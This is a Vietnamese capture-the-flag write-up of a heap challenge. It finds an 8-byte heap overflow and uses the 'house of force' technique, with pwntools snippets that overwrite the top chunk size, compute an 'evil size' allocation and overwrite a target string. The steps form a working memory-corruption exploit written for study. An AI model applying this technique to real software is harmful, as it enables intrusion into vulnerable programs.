# 1. Find Bug :

<img width="1877" height="945" alt="image" src="https://github.com/user-attachments/assets/c8e7daf3-8d03-402a-b0e8-b1c7e70c6e46" />

- Có 2 bug là `Use after free` và `Heap Overflow` 8 byte nhưng có vẻ `Use after free` ko cần, ko dùng được trong bài này

# 2. Idea :

<img width="1416" height="42" alt="image" src="https://github.com/user-attachments/assets/03ae26b8-de54-4a12-b2fd-987e400e39fe" />
---------------------------
<img width="808" height="142" alt="image" src="https://github.com/user-attachments/assets/d76e52d7-4e96-41d6-b118-be6be9f19835" />

- Mục tiêu là biến `TARGET` từ `Overwrite me!` -> `I DID!`

- Dựa vào tên bài + Leak sẵn heap_base và target address(TARGET) + malloc() tùy ý + heap overflow -> Sử dụng `house of force`

# 3. Exploit :

- STAGE 1 : Đầu tiên là nhận `heap base` và `target address`

```
p.recvuntil(b'Heap address @')
heap_base = int(p.recvline(), 16)
log.info("Heap base : " + hex(heap_base))
p.recvuntil(b'Target address @')
target_address = int(p.recvline(), 16)
log.info("Target address : " + hex(target_address))
```

<img width="925" height="383" alt="image" src="https://github.com/user-attachments/assets/902e5148-7f21-4ce6-a9dd-2d1c4dafeca5" />

- STAGE 2 : `Heap overflow` & `overwrite size top chunk`
  + Do `malloc` size tùy ý nên ta sẽ chọn 1 số và chèn `padding = size + 8`(Do luôn dư ra 8byte so với size yêu cầu) và 8byte overflow lớn nhất có thể


```
sla(b'> ', b'1')
sna(b'Size: ', 400)
sa(b'Data: ', b'a'*408 + p64(0xffffffffffffffff))
```

<img width="1143" height="770" alt="image" src="https://github.com/user-attachments/assets/29c1ed31-fe0b-4fe2-959e-9a613a21384e" />

- STAGE 3 : Tính `evil size` & kéo `top chunk` sát `target_address`
  + Công thức : `evil size = target address - top chunk gồm cả metadata - 0x20` ( Chính là size cần `malloc` để kéo topchunk )
 
  <img width="1289" height="1252" alt="image" src="https://github.com/user-attachments/assets/9d99979a-500b-4d8a-bf40-3fe7acf5cc03" />

  + Sau tính toán ta có thể thấy `top chunk = heap base + 0x1a0` -> `evil_size = (target_address - (heap_base + 0x1a0) - 0x20)`
 
  ```
  sla(b'> ', b'1')
  sna(b'Size: ', evil_size)
  sa(b'Data: ', b'a')
  ```

  <img width="2555" height="903" alt="image" src="https://github.com/user-attachments/assets/63e20ca6-1fc8-4443-950d-744b63539b2b" />

  + Sau debug ta thấy `top chunk` đã được kéo đến đúng chỗ cách `target address` 0x10 nên khi lần `malloc` tới ta sẽ viết vào đúng userdata quá đẹp

- STAGE 4 : Overwrite

  ```
  sla(b'> ', b'1') 
  sla(b'> ', b'1')
  sna(b'Size: ', 40)
  sa(b'Data: ', b'I DID!\0')
  ```

# 4. Get Flag : 

<img width="1246" height="364" alt="image" src="https://github.com/user-attachments/assets/ab174a43-6cef-457a-8838-d4ae4a2fc175" />

- Do bài này link sập rồi ko remote sever được nên chỉ có local

# 5. Learned : 

- House of force
